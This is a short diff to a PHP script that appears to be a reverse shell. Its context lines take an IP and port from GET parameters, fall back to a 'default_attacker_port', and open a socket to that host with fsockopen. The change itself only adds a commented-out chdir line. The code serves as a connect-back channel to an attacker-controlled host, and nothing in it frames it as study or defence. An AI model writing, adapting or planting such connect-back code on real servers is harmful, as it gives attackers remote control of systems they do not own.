@@ -6,6 +6,9 @@ $port = isset($_GET['port']) ? intval($_GET['port']) : default_attacker_port;  /
 // Inform the user about the target IP and port for the socket connection
 echo "Attempting to create a socket connection to IP: $ip and Port: $port\n";
 
+// Change the current working directory to C:\ or another location if you cannot navigate
+//chdir('C:\\');
+
 // Attempt to create a socket connection to the specified IP and port
 $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
